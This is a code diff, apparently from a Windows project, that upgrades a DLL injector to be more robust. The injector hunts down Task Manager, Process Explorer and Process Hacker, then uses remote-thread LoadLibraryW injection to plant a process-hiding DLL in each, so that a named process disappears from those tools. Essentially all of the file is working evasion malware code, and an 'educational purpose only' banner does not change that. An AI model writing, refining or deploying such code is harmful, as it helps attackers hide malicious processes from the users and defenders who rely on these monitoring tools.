@@ -3,185 +3,211 @@
  * 
  * This utility injects the process hiding DLL into target processes
  * like Task Manager, Process Explorer, etc.
+ * BULLETPROOF VERSION with comprehensive error handling and logging
  */
 
 #include <windows.h>
+#include <tlhelp32.h>
 #include <stdio.h>
 #include <wchar.h>
-#include <tlhelp32.h>
-#include <psapi.h>
 
-#define DLL_NAME "win_process_hider.dll"
-#define TARGET_ENV_VAR "TARGET_PROCESS"
+#pragma comment(lib, "kernel32.lib")
+#pragma comment(lib, "psapi.lib")
 
-// Function to inject DLL into a process
-BOOL InjectDLL(DWORD processId, const char* dllPath) {
-    HANDLE hProcess;
-    LPVOID pRemoteBuf;
-    LPTHREAD_START_ROUTINE pThreadProc;
-    HANDLE hThread;
-    BOOL bSuccess = FALSE;
-    SIZE_T bytesWritten = 0;
-    
-    // Get a handle to the process
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+#define DLL_NAME L"win_process_hider.dll"
+#define LOG_FILE L"C:\\injection_log.txt"
+
+// Logging function
+void WriteLog(const wchar_t* message) {
+    HANDLE hFile = CreateFileW(LOG_FILE, GENERIC_WRITE, FILE_SHARE_READ, 
+                              NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        SetFilePointer(hFile, 0, NULL, FILE_END);
+        DWORD written;
+        WriteFile(hFile, message, (DWORD)(wcslen(message) * sizeof(wchar_t)), &written, NULL);
+        WriteFile(hFile, L"\r\n", 4, &written, NULL);
+        CloseHandle(hFile);
+    }
+}
+
+// Robust DLL injection
+BOOL InjectDLL(DWORD processId, const wchar_t* dllPath) {
+    HANDLE hProcess = NULL;
+    LPVOID pRemoteBuf = NULL;
+    HANDLE hThread = NULL;
+    BOOL success = FALSE;
+    wchar_t logMsg[512];
+
+    swprintf(logMsg, 512, L"Attempting injection into PID %lu", processId);
+    WriteLog(logMsg);
+
+    // Open target process
+    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | 
+                          PROCESS_VM_WRITE, FALSE, processId);
     if (!hProcess) {
-        printf("Error: Could not open process (PID: %lu) - Error code: %lu\n", 
-               (unsigned long)processId, (unsigned long)GetLastError());
+        swprintf(logMsg, 512, L"Failed to open process %lu, error: %lu", 
+                processId, GetLastError());
+        WriteLog(logMsg);
         return FALSE;
     }
-    
-    // Allocate memory in the remote process
-    pRemoteBuf = VirtualAllocEx(hProcess, NULL, lstrlenA(dllPath) + 1, 
-                               MEM_COMMIT, PAGE_READWRITE);
+
+    // Allocate memory in target process
+    size_t pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
+    pRemoteBuf = VirtualAllocEx(hProcess, NULL, pathSize, 
+                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteBuf) {
-        printf("Error: Could not allocate memory in remote process - Error code: %lu\n", 
-               (unsigned long)GetLastError());
-        CloseHandle(hProcess);
-        return FALSE;
+        swprintf(logMsg, 512, L"Failed to allocate memory in process %lu, error: %lu", 
+                processId, GetLastError());
+        WriteLog(logMsg);
+        goto cleanup;
     }
-    
-    // Write the DLL path to the allocated memory
-    if (!WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dllPath, 
-                           lstrlenA(dllPath) + 1, &bytesWritten)) {
-        printf("Error: Could not write to remote process memory - Error code: %lu\n", 
-               (unsigned long)GetLastError());
-        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
+
+    // Write DLL path to target process
+    SIZE_T bytesWritten;
+    if (!WriteProcessMemory(hProcess, pRemoteBuf, dllPath, pathSize, &bytesWritten)) {
+        swprintf(logMsg, 512, L"Failed to write memory in process %lu, error: %lu", 
+                processId, GetLastError());
+        WriteLog(logMsg);
+        goto cleanup;
     }
+
+    // Get LoadLibraryW address
+    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)
+        GetProcAddress(hKernel32, "LoadLibraryW");
     
-    // Get address of LoadLibraryA
-    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(
-        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
-    if (!pThreadProc) {
-        printf("Error: Could not get address of LoadLibraryA - Error code: %lu\n", 
-               (unsigned long)GetLastError());
-        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
+    if (!pLoadLibrary) {
+        WriteLog(L"Failed to get LoadLibraryW address");
+        goto cleanup;
     }
-    
-    // Create a remote thread that calls LoadLibraryA with our DLL path
-    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, 
+
+    // Create remote thread
+    hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, 
                                 pRemoteBuf, 0, NULL);
     if (!hThread) {
-        printf("Error: Could not create remote thread - Error code: %lu\n", 
-               (unsigned long)GetLastError());
-        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
+        swprintf(logMsg, 512, L"Failed to create remote thread in process %lu, error: %lu", 
+                processId, GetLastError());
+        WriteLog(logMsg);
+        goto cleanup;
     }
+
+    // Wait for injection to complete
+    DWORD waitResult = WaitForSingleObject(hThread, 5000); // 5 second timeout
+    if (waitResult != WAIT_OBJECT_0) {
+        WriteLog(L"Remote thread did not complete in time");
+        goto cleanup;
+    }
+
+    // Get thread exit code
+    DWORD exitCode;
+    if (GetExitCodeThread(hThread, &exitCode) && exitCode != 0) {
+        swprintf(logMsg, 512, L"Successfully injected into process %lu", processId);
+        WriteLog(logMsg);
+        success = TRUE;
+    } else {
+        WriteLog(L"LoadLibraryW failed in target process");
+    }
+
+cleanup:
+    if (hThread) CloseHandle(hThread);
+    if (pRemoteBuf) VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
+    if (hProcess) CloseHandle(hProcess);
     
-    // Wait for the thread to finish
-    WaitForSingleObject(hThread, INFINITE);
-    
-    // Clean up
-    CloseHandle(hThread);
-    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
-    CloseHandle(hProcess);
-    
-    return TRUE;
+    return success;
 }
 
 // Get process IDs of monitoring tools
-void InjectIntoMonitoringTools(const char* targetProcess) {
+// Find and inject into monitoring tools
+int InjectIntoMonitoringTools(const wchar_t* targetProcess) {
     HANDLE hSnapshot;
-    PROCESSENTRY32W pe32; // Use Unicode version
-    DWORD currentPID;
-    BOOL injectedAny = FALSE;
-    char dllPath[MAX_PATH];
-    char currentDir[MAX_PATH];
-    
-    // Get the full path of the DLL
-    GetCurrentDirectoryA(MAX_PATH, currentDir);
-    sprintf_s(dllPath, MAX_PATH, "%s\\%s", currentDir, DLL_NAME);
-    
-    // Make sure the DLL exists
-    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
-        printf("Error: DLL not found: %s\n", dllPath);
-        printf("Make sure to run build_x64.bat first.\n");
-        return;
+    PROCESSENTRY32W pe32;
+    DWORD currentPID = GetCurrentProcessId();
+    int injectCount = 0;
+    wchar_t dllPath[MAX_PATH];
+    wchar_t logMsg[512];
+
+    // Get full DLL path
+    GetCurrentDirectoryW(MAX_PATH - 20, dllPath);
+    wcscat_s(dllPath, MAX_PATH, L"\\");
+    wcscat_s(dllPath, MAX_PATH, DLL_NAME);
+
+    // Check if DLL exists
+    if (GetFileAttributesW(dllPath) == INVALID_FILE_ATTRIBUTES) {
+        wprintf(L"❌ ERROR: DLL not found: %ls\n", dllPath);
+        wprintf(L"Please run build_x64.bat first.\n");
+        return 0;
     }
-    
-    // Get current process ID
-    currentPID = GetCurrentProcessId();
-    
-    // Set the environment variable for the target process
-    SetEnvironmentVariableA(TARGET_ENV_VAR, targetProcess);
-    printf("Set environment variable %s=%s\n", TARGET_ENV_VAR, targetProcess);
-    
-    // Create a snapshot of all processes
+
+    swprintf(logMsg, 512, L"Starting injection for target process: %ls", targetProcess);
+    WriteLog(logMsg);
+
+    // Set environment variable for DLL
+    SetEnvironmentVariableW(L"TARGET_PROCESS", targetProcess);
+
+    // Create process snapshot
     hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) {
-        printf("Error: Could not create process snapshot\n");
-        return;
+        WriteLog(L"Failed to create process snapshot");
+        return 0;
     }
-    
-    // Initialize the size of the structure
-    pe32.dwSize = sizeof(PROCESSENTRY32W);
-    
-    // Get the first process
-    if (!Process32FirstW(hSnapshot, &pe32)) {
-        printf("Error: Could not get first process\n");
-        CloseHandle(hSnapshot);
-        return;
-    }
-    
-    // Check each process
-    do {
-        // Skip our own process
-        if (pe32.th32ProcessID == currentPID)
-            continue;
 
-        // Check if it's a monitoring tool (UNICODE-safe comparison)
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (!Process32FirstW(hSnapshot, &pe32)) {
+        WriteLog(L"Failed to get first process");
+        CloseHandle(hSnapshot);
+        return 0;
+    }
+
+    do {
+        if (pe32.th32ProcessID == currentPID) continue;
+
+        // Check for monitoring tools
         if (_wcsicmp(pe32.szExeFile, L"taskmgr.exe") == 0 ||
             _wcsicmp(pe32.szExeFile, L"procexp.exe") == 0 ||
             _wcsicmp(pe32.szExeFile, L"procexp64.exe") == 0 ||
             _wcsicmp(pe32.szExeFile, L"ProcessHacker.exe") == 0) {
+            
+            wprintf(L"🎯 Found monitoring tool: %ls (PID: %lu)\n", 
+                   pe32.szExeFile, pe32.th32ProcessID);
 
-            wprintf(L"Found monitoring tool: %ls (PID: %lu)\n",
-                    pe32.szExeFile, (unsigned long)pe32.th32ProcessID);
-
-            // Inject the DLL
-            wprintf(L"Injecting into %ls...\n", pe32.szExeFile);
             if (InjectDLL(pe32.th32ProcessID, dllPath)) {
-                wprintf(L"Successfully injected into %ls\n", pe32.szExeFile);
-                injectedAny = TRUE;
+                wprintf(L"✅ Successfully injected into %ls\n", pe32.szExeFile);
+                injectCount++;
             } else {
-                wprintf(L"Failed to inject into %ls\n", pe32.szExeFile);
+                wprintf(L"❌ Failed to inject into %ls\n", pe32.szExeFile);
             }
         }
     } while (Process32NextW(hSnapshot, &pe32));
-    
-    // Clean up
+
     CloseHandle(hSnapshot);
-    
-    if (!injectedAny) {
-        printf("No process monitoring tool detected.\n");
-        printf("Please start at least one of:\n");
-        printf("- Task Manager (taskmgr.exe)\n");
-        printf("- Process Explorer (procexp.exe)\n");
-        printf("- Process Hacker (ProcessHacker.exe)\n");
-        printf("\nThen run this script again.\n");
-    } else {
-        printf("\nProcess hiding activated for: %s\n", targetProcess);
-        printf("The process should now be hidden from the injected monitoring tools.\n");
-    }
+    return injectCount;
 }
 
-int main(int argc, char* argv[]) {
+int wmain(int argc, wchar_t* argv[]) {
     if (argc != 2) {
-        printf("Usage: %s <process_name_to_hide>\n", argv[0]);
-        printf("Example: %s notepad.exe\n", argv[0]);
+        wprintf(L"Usage: %ls <process_name_to_hide>\n", argv[0]);
+        wprintf(L"Example: %ls notepad.exe\n", argv[0]);
         return 1;
     }
-    
-    printf("Windows Process Hiding Tool - EDUCATIONAL PURPOSE ONLY\n");
-    printf("===================================================\n\n");
-    printf("Target process to hide: %s\n\n", argv[1]);
-    
-    InjectIntoMonitoringTools(argv[1]);
-    
+
+    wprintf(L"🛡️  Windows Process Hiding Tool (64-bit) - EDUCATIONAL PURPOSE ONLY\n");
+    wprintf(L"==================================================================\n\n");
+    wprintf(L"Target process to hide: %ls\n\n", argv[1]);
+
+    WriteLog(L"=== INJECTION SESSION STARTED ===");
+
+    int injected = InjectIntoMonitoringTools(argv[1]);
+
+    if (injected == 0) {
+        wprintf(L"⚠️  No monitoring tools found running.\n");
+        wprintf(L"Please start Task Manager first, then run this tool again.\n");
+        return 1;
+    } else {
+        wprintf(L"\n✅ Process hiding activated for: %ls\n", argv[1]);
+        wprintf(L"📊 Injected into %d monitoring tool(s)\n", injected);
+        wprintf(L"📝 Check log file: %ls\n", LOG_FILE);
+    }
+
     return 0;
 }
